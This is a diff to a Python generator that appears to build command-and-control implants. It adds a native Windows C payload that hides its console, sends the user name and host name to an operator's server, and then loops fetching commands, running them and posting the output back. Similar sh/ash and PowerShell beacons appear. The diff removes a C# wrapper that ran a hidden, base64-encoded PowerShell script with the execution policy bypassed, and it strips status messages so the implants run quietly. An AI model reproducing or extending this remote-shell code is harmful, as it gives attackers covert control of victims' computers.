@@ -508,7 +508,108 @@ def generate_payload():
     if not os.path.exists("tools"):
         os.makedirs("tools")
 
-    if payload_type == "py":
+    # --- NATIVE EXE (C) PAYLOAD WITH VERSION & ARCH ---
+    if payload_type == "exe":
+        c_source = f'''
+#include <windows.h>
+#include <wininet.h>
+#include <stdio.h>
+#include <time.h>
+
+#define LHOST "{lhost}"
+#define LPORT {lport}
+#define WAITTIME {waittime}
+#define KILLSWITCH {killswitch}
+
+void SendPost(HINTERNET hSession, const char* path, const char* data) {{
+    HINTERNET hConnect = InternetConnectA(hSession, LHOST, LPORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hConnect) return;
+    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
+    if (hRequest) {{
+        const char* headers = "Content-Type: application/x-www-form-urlencoded";
+        HttpSendRequestA(hRequest, headers, (DWORD)-1, (LPVOID)data, (DWORD)strlen(data));
+        InternetCloseHandle(hRequest);
+    }}
+    InternetCloseHandle(hConnect);
+}}
+
+int main() {{
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    
+    char hostname[MAX_COMPUTERNAME_LENGTH + 1], username[256], id[512], regBody[2048];
+    DWORD hSize = sizeof(hostname), uSize = sizeof(username);
+    GetComputerNameA(hostname, &hSize); 
+    GetUserNameA(username, &uSize);
+    
+    // Get Version
+    OSVERSIONINFO vi;
+    vi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+    GetVersionEx(&vi);
+    char version[32];
+    sprintf(version, "%d.%d", vi.dwMajorVersion, vi.dwMinorVersion);
+
+    // Get Arch
+    SYSTEM_INFO si;
+    GetNativeSystemInfo(&si);
+    const char* arch = (si.wProcessorArchitecture == 9) ? "x64" : "x86";
+
+    sprintf(id, "%s@%s", username, hostname);
+    sprintf(regBody, "id=%s&hostname=%s&username=%s&os=Windows&version=%s&arch=%s", 
+            id, hostname, username, version, arch);
+
+    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    SendPost(hSession, "/register", regBody);
+    time_t last_success = time(NULL);
+
+    while (1) {{
+        if (difftime(time(NULL), last_success) > KILLSWITCH) break;
+        char cmdUrl[512]; 
+        sprintf(cmdUrl, "http://%s:%d/%s.html", LHOST, LPORT, id);
+        HINTERNET hReq = InternetOpenUrlA(hSession, cmdUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+        
+        if (hReq) {{
+            last_success = time(NULL);
+            char command[1024] = {{0}}; 
+            DWORD bytesRead = 0;
+            if (InternetReadFile(hReq, command, sizeof(command)-1, &bytesRead) && bytesRead > 0) {{
+                command[bytesRead] = '\\0';
+                if (strcmp(command, "exit") == 0) break;
+                
+                FILE* pipe = _popen(command, "r");
+                if (pipe) {{
+                    char output[4096] = {{0}}, resultBody[5000];
+                    fread(output, 1, sizeof(output)-1, pipe); 
+                    _pclose(pipe);
+                    sprintf(resultBody, "cmd=%s&result=%s", command, output);
+                    char resPath[512]; 
+                    sprintf(resPath, "/%s/result", id);
+                    SendPost(hSession, resPath, resultBody);
+                }}
+            }}
+            InternetCloseHandle(hReq);
+        }}
+        Sleep(WAITTIME * 1000);
+    }}
+    InternetCloseHandle(hSession);
+    return 0;
+}}
+'''
+        source_filename = f"tools/{name or f'{lhost.replace('.', '_')}_{lport}'}.c"
+        with open(source_filename, "w") as f: f.write(c_source.strip())
+        exe_name = source_filename.replace(".c", ".exe")
+        
+        # Compile with MingW
+        result = subprocess.run(["x86_64-w64-mingw32-gcc", source_filename, "-o", exe_name, "-lwininet", "-mwindows"], capture_output=True, text=True)
+        
+        if result.returncode == 0:
+            print(f"{GREEN}[+] Native EXE compiled successfully: {ORANGE}'{exe_name}'{RESET}")
+            os.remove(source_filename)
+        else:
+            print(f"{RED}[!] Compilation failed: {result.stderr}{RESET}")
+        return
+
+    # --- PYTHON PAYLOAD ---
+    elif payload_type == "py":
         payload_code = f'''import os
 import platform
 import socket
@@ -587,9 +688,10 @@ if __name__ == "__main__":
     command_loop()
 '''
 
-    elif payload_type == "sh":
-        #payload_type = "sh" was adding moree support with bash and ash, currently on hold
-        payload_code = f'''#!/bin/sh
+    # --- SHELL (SH/ASH) PAYLOAD ---
+    elif payload_type in ["sh", "ash"]:
+        shell_bin = "/bin/sh" if payload_type == "sh" else "/bin/ash"
+        payload_code = f'''#!{shell_bin}
 
 SERVERIP="{lhost}"
 SERVERPORT="{lport}"
@@ -615,8 +717,7 @@ while true; do
     CMD=$(curl -s "$SERVER/$ID.html")
     if [ $? -ne 0 ]; then
         NOW=$(date +%s)
-        if (( NOW - START > KILLSWITCH )); then
-            echo "[-] Server unreachable. Exiting."
+        if [ $((NOW - START)) -gt $KILLSWITCH ]; then
             exit 1
         fi
         sleep $WAITTIME
@@ -625,65 +726,17 @@ while true; do
     START=$(date +%s)
 
     if [ -n "$CMD" ]; then
-        if [ "$CMD" == "exit" ]; then
-            echo "[*] Exit command received. Exiting."
-            exit 0
-        fi
-        RESULT=$(bash -c "$CMD" 2>&1)
-        curl -s -X POST -d "cmd=$CMD" --data-urlencode "result=$RESULT" "$SERVER/$ID/result"
-    fi
-    sleep $WAITTIME
-done
-'''
-    elif payload_type == "ash":
-        payload_type = "sh"    
-        payload_code = f'''#!/bin/ash
-
-SERVERIP="{lhost}"
-SERVERPORT="{lport}"
-WAITTIME="{waittime}"
-KILLSWITCH="{killswitch}"
-
-HOSTNAME=$(hostname)
-USER=$(whoami)
-OS=$(uname)
-VERSION=$(uname -r)
-ARCH=$(uname -m)
-ID="$USER@$HOSTNAME"
-SERVER="http://$SERVERIP:$SERVERPORT"
-
-# Register
-curl -s -X POST -d "id=$ID" -d "hostname=$HOSTNAME" \\
-     -d "username=$USER" -d "os=$OS" -d "version=$VERSION" \\
-     -d "arch=$ARCH" "$SERVER/register"
-
-START=$(date +%s)
-
-while true; do
-    CMD=$(curl -s "$SERVER/$ID.html")
-    if [ $? -ne 0 ]; then
-        NOW=$(date +%s)
-        DIFF=$(expr "$NOW" - "$START")
-        if [ "$DIFF" -gt "$KILLSWITCH" ]; then
-            echo "[-] Server unreachable. Exiting."
-            exit 1
-        fi
-        sleep "$WAITTIME"
-        continue
-    fi
-    START=$(date +%s)
-
-    if [ -n "$CMD" ]; then
         if [ "$CMD" = "exit" ]; then
-            echo "[*] Exit command received. Exiting."
             exit 0
         fi
         RESULT=$(sh -c "$CMD" 2>&1)
         curl -s -X POST -d "cmd=$CMD" --data-urlencode "result=$RESULT" "$SERVER/$ID/result"
     fi
-    sleep "$WAITTIME"
+    sleep $WAITTIME
 done
 '''
+
+    # --- POWERSHELL (PS1) PAYLOAD ---
     elif payload_type == "ps1":
         payload_code = f'''$ServerIP = "{lhost}"
 $ServerPort = "{lport}"
@@ -717,7 +770,6 @@ try {{
 while ($true) {{
     $Now = Get-Date
     if (($Now - $StartTime).TotalSeconds -gt $KILLSWITCH) {{
-        Write-Host "[-] Server unreachable. Exiting."
         break
     }}
 
@@ -745,117 +797,16 @@ while ($true) {{
     Start-Sleep -Seconds $WAITTIME
 }}
 '''
-    elif payload_type == "exe":
-        payload_type = "cs"
-        ps1_script = f'''$ServerIP = "{lhost}"
-$ServerPort = "{lport}"
-$WAITTIME = {waittime}
-$KILLSWITCH = {killswitch}
-$StartTime = Get-Date
-
-$Hostname = $env:COMPUTERNAME
-$userRaw = whoami
-$Username = ($userRaw -split '\\\\' | Select-Object -Last 1).Trim()
-$os = Get-CimInstance -ClassName Win32_OperatingSystem
-$OSNAME = $os.Caption -replace "Microsoft ", ""
-$Version = $os.Version
-$Arch = $os.OSArchitecture
-$ID = "$Username@$Hostname"
-$Server = "http://$ServerIP`:$ServerPort"
-
-try {{
-    Invoke-RestMethod -Uri "$Server/register" -Method Post -Body @{{
-        id = $ID
-        hostname = $Hostname
-        username = $Username
-        os = $OSNAME
-        version = $Version
-        arch = $Arch
-    }}
-}} catch {{
-    exit
-}}
-
-while ($true) {{
-    $Now = Get-Date
-    if (($Now - $StartTime).TotalSeconds -gt $KILLSWITCH) {{
-        break
-    }}
-
-    try {{
-        $Cmd = Invoke-RestMethod -Uri "$Server/$ID.html"
-        $StartTime = Get-Date
-        if ($Cmd) {{
-            if ($Cmd -eq "exit") {{
-                break
-            }}
-            $Result = try {{
-                Invoke-Expression $Cmd | Out-String
-            }} catch {{
-                $_ | Out-String
-            }}
-
-            try {{
-                Invoke-RestMethod -Uri "$Server/$ID/result" -Method Post -Body @{{
-                    cmd = $Cmd
-                    result = $Result
-                }}
-            }} catch {{ }}
-        }}
-    }} catch {{ }}
-    Start-Sleep -Seconds $WAITTIME
-}}
-'''
-
-        cs_code = f'''using System;
-using System.Diagnostics;
-using System.Text;
-
-public class ReverseShell {{
-    public static void Main() {{
-        string psScript = @"
-{ps1_script.replace('"', '""')}
-";
-
-        byte[] scriptBytes = Encoding.Unicode.GetBytes(psScript);
-        string encodedScript = Convert.ToBase64String(scriptBytes);
-
-        try {{
-            Process.Start(new ProcessStartInfo {{
-                FileName = "powershell.exe",
-                Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand " + encodedScript,
-                CreateNoWindow = true,
-                UseShellExecute = false
-            }});
-        }} catch (Exception) {{ }}
-    }}
-}}'''
-
-        filename = f"tools/{name or f'{lhost}_{lport}'}.cs"
-        with open(filename, "w") as f:
-            f.write(cs_code.strip() + "\n")
-        print(f"{GREEN}[+] C# source saved as {ORANGE}'{filename}'{RESET}")
-
-        exe_name = filename.replace(".cs", ".exe")
-        result = subprocess.run(["mcs", "-out:" + exe_name, filename], capture_output=True, text=True)
-        if result.returncode != 0:
-            print(f"{RED}[!] Compilation failed:\n{result.stderr}{RESET}")
-        else:
-            print(f"{GREEN}[+] EXE payload compiled successfully as {ORANGE}'{exe_name}'{RESET}")
-            try:
-                os.remove(filename)
-            except Exception as e:
-                print(f"{ORANGE}[!] Compiled, but failed to remove source file: {e}{RESET}")
 
     else:
         print(f"{RED}[-] Payload type '{payload_type}' not supported.{RESET}")
         return
 
-    if payload_type != "cs":  # 'cs' is set for "exe", so skip writing payload_code file for exe payload
-        filename = f"tools/{name}.{payload_type}" if name else f"tools/{lhost.replace('.', '_')}_{lport}.{payload_type}"
-        with open(filename, "w") as f:
-            f.write(payload_code)
-        print(f"{GREEN}[+] Payload generated and saved as {ORANGE}'{filename}'{RESET}")
+    # Generic file writing for script-based payloads
+    filename = f"tools/{name}.{payload_type}" if name else f"tools/{lhost.replace('.', '_')}_{lport}.{payload_type}"
+    with open(filename, "w") as f:
+        f.write(payload_code)
+    print(f"{GREEN}[+] Payload generated and saved as {ORANGE}'{filename}'{RESET}")
 
 
 def start_server(port):
